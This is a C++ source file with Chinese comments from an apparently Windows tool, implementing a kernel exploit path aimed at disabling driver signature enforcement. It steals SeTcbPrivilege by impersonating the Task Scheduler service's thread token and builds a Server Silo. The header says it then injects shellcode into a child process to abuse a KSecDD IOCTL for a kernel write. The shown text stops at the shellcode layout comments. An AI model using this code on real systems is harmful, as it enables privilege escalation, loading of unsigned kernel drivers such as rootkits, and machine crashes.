// KsecDdSiloPath.cpp
// 说明见 KsecDdExecutor.h。
// 本文件实现 Server Silo 路径 (executeViaSilo)：
// 1) 跨进程、按启动周期持久化的调用计数器（fail-closed，上限 4 次）；
// 2) 从 Schedule 服务线程窃取 SeTcbPrivilege；
// 3) 创建 Server Silo 并配置最小可用的对象命名空间；
// 4) 在 Silo 内启动子进程并注入 shellcode：打开 KSecDD → 连接 → 执行；
// 5) 回收结果并销毁 Silo 与子进程。
//
// 硬性限制：KSecDD 在处理 SET_FUNCTION_RETURN 时会释放用户缓冲区作为内核池，
// 第 5 次调用会触发 Bug Check。计数器必须跨进程、跨页面全局共享，
// 且在无法读取时 fail-closed（拒绝执行）。

#include "KsecDdExecutor.h"
#include "../../../../shared/driver/KsecDdProtocol.h"

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

#include <algorithm>
#include <array>
#include <cstring>
#include <string>
#include <vector>

namespace
{
    // proto：KSecDD 协议常量与结构的命名空间别名，唯一定义在 KsecDdProtocol.h。
    namespace proto = ks::misc::disable_dse::ksec_protocol;

    // JOBOBJECT_EXTENDED_LIMIT_INFORMATION 的 V2 版本：多一个 JobTotalMemoryLimit 字段。
    // Windows 11 22H2+ 内核的 NtSetInformationJobObject(class 9) 要求此大小（152 字节），
    // 标准版（144 字节）会返回 STATUS_INVALID_PARAMETER (0xC000000D)。
    // JOBOBJECT_EXTENDED_LIMIT_INFORMATION_V2（Win10+ 扩展版，包含 JobLowLimit 字段）。
    struct JobExtendedLimitInfoV2
    {
        JOBOBJECT_BASIC_LIMIT_INFORMATION BasicLimitInformation;  // BasicLimitInformation：基础限制信息。
        IO_COUNTERS IoInfo;                                       // IoInfo：I/O 计数器。
        SIZE_T ProcessMemoryLimit;                                // ProcessMemoryLimit：单进程内存限制。
        SIZE_T JobMemoryLimit;                                    // JobMemoryLimit：Job 级内存限制。
        SIZE_T PeakProcessMemoryUsed;                             // PeakProcessMemoryUsed：峰值进程内存。
        SIZE_T PeakJobMemoryUsed;                                 // PeakJobMemoryUsed：峰值 Job 内存。
        SIZE_T JobTotalMemoryLimit;                               // JobTotalMemoryLimit：V2 新增，总内存限制。
    };

    // ================================================================
    // 二、ntdll 未导出函数签名
    // ================================================================

    // NtSetInformationJobObjectFn：设置 Job 信息（含 Silo 转换）。
    using NtSetInformationJobObjectFn = long(NTAPI*)(
        HANDLE jobHandle,
        unsigned long jobObjectInformationClass,
        void* jobObjectInformation,
        unsigned long jobObjectInformationLength);

    // NtImpersonateThreadFn：令当前线程模拟另一线程的安全上下文。
    using NtImpersonateThreadFn = long(NTAPI*)(
        HANDLE serverThreadHandle,
        HANDLE clientThreadHandle,
        SECURITY_QUALITY_OF_SERVICE* securityQos);

    // NtOpenFileFn：打开设备或文件对象。
    using NtOpenFileFn = long(NTAPI*)(
        HANDLE* fileHandle,
        ACCESS_MASK desiredAccess,
        OBJECT_ATTRIBUTES* objectAttributes,
        IO_STATUS_BLOCK* ioStatusBlock,
        unsigned long shareAccess,
        unsigned long openOptions);

    // NtDeviceIoControlFileFn：发送 IOCTL。
    using NtDeviceIoControlFileFn = long(NTAPI*)(
        HANDLE fileHandle,
        HANDLE event,
        void* apcRoutine,
        void* apcContext,
        IO_STATUS_BLOCK* ioStatusBlock,
        unsigned long ioControlCode,
        void* inputBuffer,
        unsigned long inputBufferLength,
        void* outputBuffer,
        unsigned long outputBufferLength);

    // NtRevertToSelfFn：结束当前线程的模拟。
    using NtRevertToSelfFn = long(NTAPI*)();

    // NtQueryInformationJobObjectFn：查询 Job 信息（含 Silo 根目录句柄）。
    using NtQueryInformationJobObjectFn = long(NTAPI*)(
        HANDLE jobHandle,
        unsigned long jobObjectInformationClass,
        void* jobObjectInformation,
        unsigned long jobObjectInformationLength,
        unsigned long* returnLength);

    // NtCreateDirectoryObjectFn：创建对象目录。
    using NtCreateDirectoryObjectFn = long(NTAPI*)(
        HANDLE* directoryHandle,
        ACCESS_MASK desiredAccess,
        OBJECT_ATTRIBUTES* objectAttributes);

    // NtCloseFn：关闭内核句柄。
    using NtCloseFn = long(NTAPI*)(HANDLE handle);

    // NtAssignProcessToJobObjectFn：将进程分配到 Job/Silo。
    using NtAssignProcessToJobObjectFn = long(NTAPI*)(
        HANDLE jobHandle,
        HANDLE processHandle);

    // RtlAdjustPrivilegeFn：启用或禁用进程/线程令牌中的特权。
    using RtlAdjustPrivilegeFn = long(NTAPI*)(
        unsigned long privilege,
        unsigned char enable,
        unsigned char client,
        unsigned char* wasEnabled);

    // NtOpenDirectoryObjectFn：打开对象目录。
    using NtOpenDirectoryObjectFn = long(NTAPI*)(
        HANDLE* directoryHandle,
        ACCESS_MASK desiredAccess,
        OBJECT_ATTRIBUTES* objectAttributes);

    // NtCreateDirectoryObjectExFn：创建影子对象目录（用于 Silo 命名空间）。
    using NtCreateDirectoryObjectExFn = long(NTAPI*)(
        HANDLE* directoryHandle,
        ACCESS_MASK desiredAccess,
        OBJECT_ATTRIBUTES* objectAttributes,
        HANDLE shadowDirectoryHandle,
        unsigned long flags);

    // RtlCreateUnicodeStringFn：堆分配 UNICODE_STRING 副本。
    using RtlCreateUnicodeStringFn = BOOLEAN(NTAPI*)(
        UNICODE_STRING* destinationString,
        const wchar_t* sourceString);

    // RtlFreeUnicodeStringFn：释放 RtlCreateUnicodeString 分配的缓冲区。
    using RtlFreeUnicodeStringFn = void(NTAPI*)(
        UNICODE_STRING* unicodeString);

    // resolveNtdllFunction：
    // - 输入 name：函数名；
    // - 作用：从 ntdll 获取指定函数指针；
    // - 返回：函数指针，失败返回 nullptr。
    template <typename FnType>
    FnType resolveNtdllFunction(const char* const name)
    {
        const HMODULE ntdll = ::GetModuleHandleW(L"ntdll.dll");
        if (ntdll == nullptr)
        {
            return nullptr;
        }
        return reinterpret_cast<FnType>(::GetProcAddress(ntdll, name));
    }

    // ================================================================
    // 三、跨进程调用计数器
    // ================================================================

    // kVolatileRegKeyPath：
    // - 作用：volatile 注册表键路径，用于存放启动周期内的 Silo 调用计数；
    //   REG_OPTION_VOLATILE 保证重启后自动消失，而进程全退出后值仍保留。
    constexpr wchar_t kVolatileRegKeyPath[] =
        L"SOFTWARE\\KswordARK\\VolatileCounters";

    // kVolatileRegValueName：计数值的名称。
    constexpr wchar_t kVolatileRegValueName[] = L"SiloCallCount";

    // SiloCallCounter：
    // - 作用：通过 volatile 注册表键实现跨进程、按启动周期的计数器。
    //   注册表 REG_OPTION_VOLATILE 键在重启后自动销毁，但在所有进程退出后仍保留值，
    //   解决了原先命名共享内存在最后一个进程退出后计数归零的问题。
    //   写入需要管理员权限，与 KSecDD Silo 路径的特权要求一致。
    class SiloCallCounter final
    {
    public:
        SiloCallCounter()
        {
            // 创建或打开 volatile 注册表键。
            DWORD disposition = 0;
            const LSTATUS createStatus = ::RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                kVolatileRegKeyPath,
                0,
                nullptr,
                REG_OPTION_VOLATILE,
                KEY_READ | KEY_WRITE,
                nullptr,
                &m_key,
                &disposition);
            if (createStatus != ERROR_SUCCESS)
            {
                m_key = nullptr;
            }

            // 创建命名互斥体，保护 tryAcquire 的 read-increment-write 序列，
            // 避免两个并发调用方同时读到相同计数导致多放行一次。
            m_mutex = ::CreateMutexW(
                nullptr, FALSE, L"Global\\KswordARK_SiloCallCounter");
        }

        ~SiloCallCounter()
        {
            if (m_key != nullptr)
            {
                ::RegCloseKey(m_key);
            }
            if (m_mutex != nullptr)
            {
                ::CloseHandle(m_mutex);
            }
        }

        SiloCallCounter(const SiloCallCounter&) = delete;
        SiloCallCounter& operator=(const SiloCallCounter&) = delete;

        // tryAcquire：
        // - 作用：在命名互斥体保护下递增注册表计数器，
        //   若递增后超过上限则回退并返回 false；
        // - 返回：true 表示获准执行一次调用。
        // - 语义：fail-closed，互斥体或注册表操作失败时拒绝执行。
        bool tryAcquire()
        {
            if (m_key == nullptr || m_mutex == nullptr)
            {
                return false;
            }

            // 持有命名互斥体期间完成 read-check-write，防止 TOCTOU 竞态。
            const DWORD waitResult = ::WaitForSingleObject(m_mutex, 5000);
            if (waitResult != WAIT_OBJECT_0 && waitResult != WAIT_ABANDONED)
            {
                return false;
            }

            const long current = readCount();
            bool acquired = false;
            if (current >= 0 && current < proto::kMaxSiloCallsPerBoot)
            {
                const DWORD newValue = static_cast<DWORD>(current + 1);
                const LSTATUS setStatus = ::RegSetValueExW(
                    m_key,
                    kVolatileRegValueName,
                    0,
                    REG_DWORD,
                    reinterpret_cast<const BYTE*>(&newValue),
                    sizeof(newValue));
                acquired = (setStatus == ERROR_SUCCESS);
            }

            ::ReleaseMutex(m_mutex);
            return acquired;
        }

        // currentCount：
        // - 作用：只读查询当前计数（仅用于诊断显示）。
        long currentCount() const
        {
            return readCount();
        }

        // available：注册表键是否打开成功。
        bool available() const { return m_key != nullptr; }

    private:
        HKEY m_key = nullptr;      // m_key：volatile 注册表键句柄。
        HANDLE m_mutex = nullptr;  // m_mutex：命名互斥体，保护 tryAcquire 原子性。

        // readCount：
        // - 作用：从 volatile 注册表键读取当前计数值；
        //   值不存在时返回 0（首次调用），失败时返回 -1（fail-closed）。
        long readCount() const
        {
            if (m_key == nullptr)
            {
                return -1;
            }
            DWORD value = 0;
            DWORD size = sizeof(value);
            DWORD type = 0;
            const LSTATUS queryStatus = ::RegQueryValueExW(
                m_key,
                kVolatileRegValueName,
                nullptr,
                &type,
                reinterpret_cast<BYTE*>(&value),
                &size);
            if (queryStatus == ERROR_FILE_NOT_FOUND)
            {
                return 0;
            }
            if (queryStatus != ERROR_SUCCESS || type != REG_DWORD)
            {
                return -1;
            }
            return static_cast<long>(value);
        }
    };

    // ================================================================
    // 四、SeTcbPrivilege 窃取
    // ================================================================

    // acquireSeTcbPrivilege：
    // - 输入 trace：诊断输出；tokenOut：捕获的令牌句柄（调用方需关闭）。
    // - 作用：按 KSecDD Server Silo 特权链获取 SeTcbPrivilege。
    //   (1) 启用 SeImpersonate；(2) 启用 SeDebug；
    //   (3) 模拟 Schedule 线程并捕获其令牌；
    //   (4) 在捕获的令牌上启用 SeTcb；
    //   (5) 使用增强令牌进行模拟。
    // - 返回：true 表示当前线程已处于含 SeTcb 的模拟状态。
    bool acquireSeTcbPrivilege(QStringList& trace, HANDLE& tokenOut)
    {
        tokenOut = nullptr;

        // (1) 在当前进程令牌中启用 SeImpersonatePrivilege (ID=29)。
        const auto rtlAdjustPrivilege =
            resolveNtdllFunction<RtlAdjustPrivilegeFn>("RtlAdjustPrivilege");
        if (rtlAdjustPrivilege == nullptr)
        {
            trace.append(QStringLiteral("无法获取 RtlAdjustPrivilege 入口。"));
            return false;
        }

        unsigned char wasEnabled = 0;
        constexpr unsigned long kSeImpersonatePrivilege = 29;
        constexpr unsigned long kSeDebugPrivilege = 20;

        long status = rtlAdjustPrivilege(
            kSeImpersonatePrivilege, TRUE, FALSE, &wasEnabled);
        if (status < 0)
        {
            trace.append(
                QStringLiteral("SeImpersonatePrivilege 启用失败，NTSTATUS=0x%1（继续尝试）。")
                    .arg(static_cast<unsigned long>(status), 8, 16, QChar('0')));
        }
        else
        {
            trace.append(QStringLiteral("SeImpersonatePrivilege 已启用。"));
        }

        // (2) 在当前进程令牌中启用 SeDebugPrivilege (ID=20)。
        status = rtlAdjustPrivilege(kSeDebugPrivilege, TRUE, FALSE, &wasEnabled);
        if (status < 0)
        {
            trace.append(
                QStringLiteral("SeDebugPrivilege 启用失败，NTSTATUS=0x%1（继续尝试）。")
                    .arg(static_cast<unsigned long>(status), 8, 16, QChar('0')));
        }
        else
        {
            trace.append(QStringLiteral("SeDebugPrivilege 已启用。"));
        }

        // (3) 查询 Schedule 服务 PID 并捕获其令牌。
        const auto ntImpersonateThread =
            resolveNtdllFunction<NtImpersonateThreadFn>("NtImpersonateThread");
        if (ntImpersonateThread == nullptr)
        {
            trace.append(QStringLiteral("无法获取 NtImpersonateThread 入口。"));
            return false;
        }

        // 通过 SCM 查询 Schedule 服务的 PID。
        DWORD schedulePid = 0;
        {
            const SC_HANDLE scm = ::OpenSCManagerW(
                nullptr, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_CONNECT);
            if (scm == nullptr)
            {
                trace.append(QStringLiteral("无法打开服务控制管理器。"));
                return false;
            }

            const SC_HANDLE svc = ::OpenServiceW(
                scm, L"Schedule", SERVICE_QUERY_STATUS);
            if (svc == nullptr)
            {
                ::CloseServiceHandle(scm);
                trace.append(QStringLiteral("无法打开 Schedule 服务。"));
                return false;
            }

            SERVICE_STATUS_PROCESS ssp{};
            DWORD bytesNeeded = 0;
            if (::QueryServiceStatusEx(
                    svc, SC_STATUS_PROCESS_INFO,
                    reinterpret_cast<BYTE*>(&ssp),
                    sizeof(ssp), &bytesNeeded) != FALSE)
            {
                schedulePid = ssp.dwProcessId;
            }
            ::CloseServiceHandle(svc);
            ::CloseServiceHandle(scm);
        }

        if (schedulePid == 0)
        {
            trace.append(QStringLiteral("无法取得 Schedule 服务的 PID。"));
            return false;
        }
        trace.append(
            QStringLiteral("Schedule 服务 PID = %1").arg(schedulePid));

        // 遍历线程快照找到属于 Schedule 进程的线程。
        const HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snapshot == INVALID_HANDLE_VALUE)
        {
            trace.append(QStringLiteral("CreateToolhelp32Snapshot 失败。"));
            return false;
        }

        HANDLE scheduleThread = nullptr;
        THREADENTRY32 te{};
        te.dwSize = sizeof(te);
        if (::Thread32First(snapshot, &te) != FALSE)
        {
            do
            {
                if (te.th32OwnerProcessID == schedulePid)
                {
                    scheduleThread = ::OpenThread(
                        THREAD_DIRECT_IMPERSONATION, FALSE, te.th32ThreadID);
                    if (scheduleThread != nullptr)
                    {
                        trace.append(
                            QStringLiteral("打开 Schedule 线程 TID = %1")
                                .arg(te.th32ThreadID));
                        break;
                    }
                }
            } while (::Thread32Next(snapshot, &te) != FALSE);
        }
        ::CloseHandle(snapshot);

        if (scheduleThread == nullptr)
        {
            trace.append(QStringLiteral("无法打开 Schedule 服务的任何线程。"));
            return false;
        }

        // 临时模拟 Schedule 线程以捕获其令牌。
        SECURITY_QUALITY_OF_SERVICE sqos{};
        sqos.Length = sizeof(sqos);
        sqos.ImpersonationLevel = SecurityImpersonation;
        sqos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
        sqos.EffectiveOnly = FALSE;

        const HANDLE currentThread =
            reinterpret_cast<HANDLE>(static_cast<intptr_t>(-2));
        status = ntImpersonateThread(currentThread, scheduleThread, &sqos);
        ::CloseHandle(scheduleThread);

        if (status < 0)
        {
            trace.append(
                QStringLiteral("NtImpersonateThread 失败，NTSTATUS=0x%1。")
                    .arg(static_cast<unsigned long>(status), 8, 16, QChar('0')));
            return false;
        }

        // 打开当前线程的模拟令牌（即 Schedule 服务的令牌）。
        HANDLE capturedToken = nullptr;
        if (::OpenThreadToken(
                ::GetCurrentThread(), TOKEN_ALL_ACCESS,
                FALSE, &capturedToken) == FALSE)
        {
            ::RevertToSelf();
            trace.append(
                QStringLiteral("OpenThreadToken 失败，Win32 错误 %1。")
                    .arg(::GetLastError()));
            return false;
        }

        // 撤销初始模拟，后续使用增强令牌重新模拟。
        ::RevertToSelf();
        trace.append(QStringLiteral("已捕获 Schedule 令牌。"));

        // (4) 在捕获的令牌上启用 SeTcbPrivilege。
        TOKEN_PRIVILEGES tp{};
        LUID tcbLuid{};
        if (::LookupPrivilegeValueW(nullptr, SE_TCB_NAME, &tcbLuid) == FALSE)
        {
            ::CloseHandle(capturedToken);
            trace.append(QStringLiteral("LookupPrivilegeValue(SeTcb) 失败。"));
            return false;
        }
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = tcbLuid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (::AdjustTokenPrivileges(
                capturedToken, FALSE, &tp,
                sizeof(tp), nullptr, nullptr) == FALSE
            || ::GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        {
            ::CloseHandle(capturedToken);
            trace.append(QStringLiteral("AdjustTokenPrivileges(SeTcb) 失败。"));
            return false;
        }
        trace.append(QStringLiteral("SeTcbPrivilege 已在 Schedule 令牌中启用。"));

        // (5) 使用包含 SeTcb 的令牌进行模拟。
        if (::SetThreadToken(nullptr, capturedToken) == FALSE)
        {
            ::CloseHandle(capturedToken);
            trace.append(
                QStringLiteral("SetThreadToken 失败，Win32 错误 %1。")
                    .arg(::GetLastError()));
            return false;
        }

        tokenOut = capturedToken;
        trace.append(QStringLiteral("已模拟增强令牌（含 SeTcbPrivilege）。"));
        return true;
    }

    // ================================================================
    // 五、Server Silo 创建与销毁
    // ================================================================

    // SiloGuard：
    // - 作用：RAII 封装 Server Silo 的 Job 句柄与 DeleteEvent 句柄，析构时关闭。
    //   析构时才关闭 DeleteEvent，不能在 Initialize 后立即关。
    class SiloGuard final
    {
    public:
        SiloGuard() = default;
        ~SiloGuard()
        {
            if (m_job != nullptr)
            {
                // 先终止 Silo 内的所有进程，再关闭 Job 句柄。
                ::TerminateJobObject(m_job, 0);
                ::CloseHandle(m_job);
            }
            if (m_deleteEvent != nullptr)
            {
                ::CloseHandle(m_deleteEvent);
            }
        }

        SiloGuard(const SiloGuard&) = delete;
        SiloGuard& operator=(const SiloGuard&) = delete;

        // create：
        // - 输入 trace：诊断输出；
        // - 作用：创建 Job 对象并执行完整 9 步 Server Silo 初始化序列；
        // - 返回：true 表示 Silo 就绪，可接受子进程。
        //
        // 9 步序列：
        //   1. CreateJobObject
        //   2. SetLimitFlags(SILO_READY)
        //   3. NtSetInformationJobObject(class 35) — 转换为 Silo
        //   4. NtAssignProcessToJobObject((HANDLE)-7) — 临时加入 Silo
        //   5. NtSetInformationJobObject(class 37, ControlFlags=7) — 设置根目录
        //   6. NtSetInformationJobObject(class 45) — 设置 SystemRoot
        //   7. NtQueryInformationJobObject(class 37) — 取根目录路径
        //   8. NtCreateDirectoryObjectEx — 创建 \Device 影子目录
        //   9. NtSetInformationJobObject(class 40) — 最终初始化
        bool create(QStringList& trace)
        {
            // 获取所需 ntdll 入口。
            const auto ntSetInfoJob =
                resolveNtdllFunction<NtSetInformationJobObjectFn>(
                    "NtSetInformationJobObject");
            const auto ntQueryInfoJob =
                resolveNtdllFunction<NtQueryInformationJobObjectFn>(
                    "NtQueryInformationJobObject");
            const auto ntAssignProcess =
                resolveNtdllFunction<NtAssignProcessToJobObjectFn>(
                    "NtAssignProcessToJobObject");
            const auto ntOpenDirObj =
                resolveNtdllFunction<NtOpenDirectoryObjectFn>(
                    "NtOpenDirectoryObject");
            const auto ntCreateDirObjEx =
                resolveNtdllFunction<NtCreateDirectoryObjectExFn>(
                    "NtCreateDirectoryObjectEx");
            const auto ntClose =
                resolveNtdllFunction<NtCloseFn>("NtClose");
            if (ntSetInfoJob == nullptr || ntQueryInfoJob == nullptr
                || ntAssignProcess == nullptr || ntOpenDirObj == nullptr
                || ntCreateDirObjEx == nullptr || ntClose == nullptr)
            {
                trace.append(QStringLiteral(
                    "无法获取 Silo 创建所需的 ntdll 入口。"));
                return false;
            }

            // Step 1: 创建空 Job 对象。
            m_job = ::CreateJobObjectW(nullptr, nullptr);
            if (m_job == nullptr)
            {
                trace.append(
                    QStringLiteral("CreateJobObjectW 失败，Win32 错误 %1。")
                        .arg(::GetLastError()));
                return false;
            }

            // Step 2: 设置 JOB_OBJECT_LIMIT_SILO_READY 标志。
            // 必须走 NT 系统调用且使用 V2 结构体（152 字节）。
            // Win11 22H2 内核校验缓冲区大小，标准版（144 字节）返回 0xC000000D。
            JobExtendedLimitInfoV2 jeli{};
            jeli.BasicLimitInformation.LimitFlags =
                proto::kJobObjectLimitSiloReady;
            long status = ntSetInfoJob(
                m_job, proto::kJobObjectExtendedLimitInformation,
                &jeli, sizeof(jeli));
            if (status < 0)
            {
                trace.append(
                    QStringLiteral(
                        "SetLimitFlags(SILO_READY) 失败，NTSTATUS=0x%1。")
                        .arg(static_cast<unsigned long>(status),
                             8, 16, QChar('0')));
                return false;
            }

            // Step 3: 转换为 Silo（class 35）。
            status = ntSetInfoJob(
                m_job, proto::kJobObjectCreateSilo, nullptr, 0);
            if (status < 0)
            {
                trace.append(
                    QStringLiteral(
                        "CreateSilo (class 35) 失败，NTSTATUS=0x%1。")
                        .arg(static_cast<unsigned long>(status),
                             8, 16, QChar('0')));
                return false;
            }
            trace.append(QStringLiteral("Job 已转换为 Server Silo。"));

            // Step 4: 将当前进程临时加入 Silo 以配置命名空间。
            // (HANDLE)-7 是 NtCurrentSiloProcess，不是 NtCurrentProcess (-1)。
            const HANDLE siloProcess =
                reinterpret_cast<HANDLE>(static_cast<intptr_t>(-7));
            status = ntAssignProcess(m_job, siloProcess);
            if (status < 0)
            {
                trace.append(
                    QStringLiteral(
                        "NtAssignProcessToJobObject 失败，NTSTATUS=0x%1。")
                        .arg(static_cast<unsigned long>(status),
                             8, 16, QChar('0')));
                return false;
            }

            // Step 5: 设置 Silo 根目录（class 37）。
            // 结构是 union { ULONG ControlFlags; UNICODE_STRING Path; }。
            // SET 操作只需写 ControlFlags。
            struct
            {
                union
                {
                    unsigned long controlFlags;
                    UNICODE_STRING path;
                };
            } srd{};
            srd.controlFlags = proto::kSiloObjectRootDirectoryAll;
            status = ntSetInfoJob(
                m_job, proto::kJobObjectSiloRootDirectory,
                &srd, sizeof(srd));
            if (status < 0)
            {
                trace.append(
                    QStringLiteral(
                        "SetRootDirectory (class 37) 失败，NTSTATUS=0x%1。")
                        .arg(static_cast<unsigned long>(status),
                             8, 16, QChar('0')));
                return false;
            }

            // Step 6: 设置 SystemRoot（class 45）。
            // 使用 RtlCreateUnicodeString 堆分配字符串副本。
            const auto rtlCreateUniStr =
                resolveNtdllFunction<RtlCreateUnicodeStringFn>(
                    "RtlCreateUnicodeString");
            const auto rtlFreeUniStr =
                resolveNtdllFunction<RtlFreeUnicodeStringFn>(
                    "RtlFreeUnicodeString");

            wchar_t sysRootBuf[MAX_PATH] = {};
            const UINT sysRootLen = ::GetWindowsDirectoryW(
                sysRootBuf, MAX_PATH);
            if (sysRootLen == 0 || sysRootLen >= MAX_PATH)
            {
                trace.append(QStringLiteral("GetWindowsDirectoryW 失败。"));
                return false;
            }
            // 移除可能的尾部反斜杠。
            if (sysRootLen > 0 && sysRootBuf[sysRootLen - 1] == L'\\')
            {
                sysRootBuf[sysRootLen - 1] = L'\0';
            }
            trace.append(
                QStringLiteral("SystemRoot 路径：%1")
                    .arg(QString::fromWCharArray(sysRootBuf)));

            // 堆分配 UNICODE_STRING 和字符串副本。
            UNICODE_STRING sysRoot{};
            bool sysRootAllocated = false;
            if (rtlCreateUniStr != nullptr
                && rtlCreateUniStr(&sysRoot, sysRootBuf))
            {
                sysRootAllocated = true;
            }
            else
            {
                // 后备：栈上构造。
                sysRoot.Buffer = sysRootBuf;
                sysRoot.Length = static_cast<USHORT>(
                    wcslen(sysRootBuf) * sizeof(wchar_t));
                sysRoot.MaximumLength = static_cast<USHORT>(
                    sysRoot.Length + sizeof(wchar_t));
            }
            status = ntSetInfoJob(
                m_job, proto::kJobObjectSiloSystemRoot,
                &sysRoot, sizeof(sysRoot));
            // 释放堆分配的字符串。
            if (sysRootAllocated && rtlFreeUniStr != nullptr)
            {
                rtlFreeUniStr(&sysRoot);
            }
            if (status < 0)
            {
                // 0x80000002 (STATUS_DATATYPE_MISALIGNMENT) 是 warning 级别，
                // 不一定阻止后续 Silo 操作——降级为非致命，继续尝试。
                const bool isFatal =
                    (static_cast<unsigned long>(status) & 0xC0000000UL)
                    == 0xC0000000UL;
                trace.append(
                    QStringLiteral(
                        "SetSystemRoot (class 45) %1，NTSTATUS=0x%2。")
                        .arg(isFatal
                                 ? QStringLiteral("失败")
                                 : QStringLiteral("返回警告（继续）"))
                        .arg(static_cast<unsigned long>(status),
                             8, 16, QChar('0')));
                if (isFatal)
                    return false;
            }

            // Step 7: 查询根目录路径（class 37）。
            // 分配 0x1000 字节缓冲区，取回 UNICODE_STRING Path。
            constexpr unsigned long kQrdBufSize = 0x1000;
            std::vector<unsigned char> qrdBuf(kQrdBufSize, 0);
            unsigned long retLen = 0;
            status = ntQueryInfoJob(
                m_job, proto::kJobObjectSiloRootDirectory,
                qrdBuf.data(), kQrdBufSize, &retLen);
            if (status < 0)
            {
                trace.append(
                    QStringLiteral(
                        "QueryRootDirectory (class 37) 失败，NTSTATUS=0x%1。")
                        .arg(static_cast<unsigned long>(status),
                             8, 16, QChar('0')));
                return false;
            }
            // 查询结果在 union 的 Path 成员中。
            const auto* const qrdResult =
                reinterpret_cast<const UNICODE_STRING*>(qrdBuf.data());
            if (qrdResult->Buffer == nullptr || qrdResult->Length == 0)
            {
                trace.append(QStringLiteral(
                    "QueryRootDirectory 返回了空路径。"));
                return false;
            }
            const std::wstring rootDir(
                qrdResult->Buffer,
                qrdResult->Length / sizeof(wchar_t));
            trace.append(
                QStringLiteral("Silo 根目录路径 = %1")
                    .arg(QString::fromStdWString(rootDir)));

            // Step 8: 创建 \Device 影子目录。
            // 使用 NtCreateDirectoryObjectEx，以全局 \Device 为影子源。

            // (8a) 打开全局 \Device 目录。
            constexpr ACCESS_MASK kMaximumAllowed = 0x02000000UL;
            UNICODE_STRING globalDevName{};
            wchar_t globalDevBuf[] = L"\\Device";
            globalDevName.Buffer = globalDevBuf;
            globalDevName.Length = 14;
            globalDevName.MaximumLength = 16;
            OBJECT_ATTRIBUTES globalDevOa{};
            globalDevOa.Length = sizeof(globalDevOa);
            globalDevOa.ObjectName = &globalDevName;
            globalDevOa.Attributes = OBJ_CASE_INSENSITIVE;
            HANDLE hGlobalDevice = nullptr;
            status = ntOpenDirObj(
                &hGlobalDevice, kMaximumAllowed, &globalDevOa);
            if (status < 0)
            {
                trace.append(
                    QStringLiteral(
                        "NtOpenDirectoryObject(\\Device) 失败，NTSTATUS=0x%1。")
                        .arg(static_cast<unsigned long>(status),
                             8, 16, QChar('0')));
                return false;
            }

            // (8b) 构建 Silo 内的 \Device 路径并创建影子目录。
            const std::wstring siloDevPath = rootDir + L"\\Device";
            UNICODE_STRING siloDevName{};
            siloDevName.Buffer = const_cast<wchar_t*>(siloDevPath.c_str());
            siloDevName.Length = static_cast<USHORT>(
                siloDevPath.size() * sizeof(wchar_t));
            siloDevName.MaximumLength = static_cast<USHORT>(
                siloDevName.Length + sizeof(wchar_t));
            constexpr unsigned long kObjPermanent = 0x00000010UL;
            constexpr unsigned long kObjOpenIf    = 0x00000080UL;
            OBJECT_ATTRIBUTES siloDevOa{};
            siloDevOa.Length = sizeof(siloDevOa);
            siloDevOa.ObjectName = &siloDevName;
            siloDevOa.Attributes =
                OBJ_CASE_INSENSITIVE | kObjPermanent | kObjOpenIf;
            HANDLE hSiloDevice = nullptr;
            status = ntCreateDirObjEx(
                &hSiloDevice, kMaximumAllowed,
                &siloDevOa, hGlobalDevice, 0);
            // 清理句柄。
            if (hSiloDevice != nullptr) { ntClose(hSiloDevice); }
            ntClose(hGlobalDevice);
            if (status < 0)
            {
                trace.append(
                    QStringLiteral("NtCreateDirectoryObjectEx(\\Device) 失败，NTSTATUS=0x%1。")
                        .arg(static_cast<unsigned long>(status),
                             8, 16, QChar('0')));
                return false;
            }

            // Step 9: 最终初始化 Silo（class 40）。
            // DeleteEvent 保留在成员中，析构时关闭。
            m_deleteEvent = ::CreateEventW(nullptr, TRUE, FALSE, nullptr);
            struct
            {
                HANDLE deleteEvent;
                unsigned char isDownlevelContainer;
            } ssii{};
            ssii.deleteEvent = m_deleteEvent;
            ssii.isDownlevelContainer = 0;
            status = ntSetInfoJob(
                m_job, proto::kJobObjectServerSiloInitialize,
                &ssii, sizeof(ssii));
            if (status == static_cast<long>(0xC0000004))
            {
                // STATUS_INFO_LENGTH_MISMATCH：旧版布局不含
                // isDownlevelContainer，只发送 HANDLE。
                status = ntSetInfoJob(
                    m_job, proto::kJobObjectServerSiloInitialize,
                    &ssii.deleteEvent, sizeof(HANDLE));
            }
            if (status < 0)
            {
                trace.append(
                    QStringLiteral("ServerSiloInitialize (class 40) 失败，NTSTATUS=0x%1。")
                        .arg(static_cast<unsigned long>(status),
                             8, 16, QChar('0')));
                return false;
            }

            trace.append(QStringLiteral("Server Silo 9 步初始化完成。"));
            return true;
        }

        // job：返回 Silo Job 句柄。
        HANDLE job() const { return m_job; }

    private:
        HANDLE m_job = nullptr;         // m_job：Silo 的 Job 句柄。
        HANDLE m_deleteEvent = nullptr; // m_deleteEvent：Silo 销毁事件。
    };

    // ================================================================
    // 六、子进程 shellcode 构建
    // ================================================================

    // 子进程 shellcode 执行序列（KSecDD 连接 + SET_FUNCTION_RETURN 写入）：
    //   1. NtOpenEvent + NtSetEvent：信号 LSA 认证初始化事件
    //   2. NtOpenFile：打开 \Device\KsecDD
    //   3. NtSetInformationFile(class 41, flags=0x6)：设置完成通知
    //   4. NtDeviceIoControlFile(0x398000)：ConnectLsa
    //   5. 填写 FunctionReturn 指针
    //   6. NtDeviceIoControlFile(0x39006F)：SET_FUNCTION_RETURN（正确 16 字节 ABI）
    //
    // 数据布局（紧跟代码段，偏移相对于数据段起始 = kCodeSize）：
    //   [0x000..0x030)  6 个 ntdll 函数指针（每个 8 字节）
    //   [0x030..0x038)  HANDLE eventHandle
    //   [0x038..0x040)  HANDLE deviceHandle
    //   [0x040..0x058)  6 × NTSTATUS 结果（各 4 字节）
    //   [0x058..0x05C)  DWORD connectOutputPid
    //   [0x05C..0x060)  DWORD setInfoFlags（= 0x6，预填充）
    //   [0x060..0x070)  IO_STATUS_BLOCK（16 字节）
    //   [0x070..0x080)  UNICODE_STRING eventName
    //   [0x080..0x0B0)  OBJECT_ATTRIBUTES eventOA（48 字节）
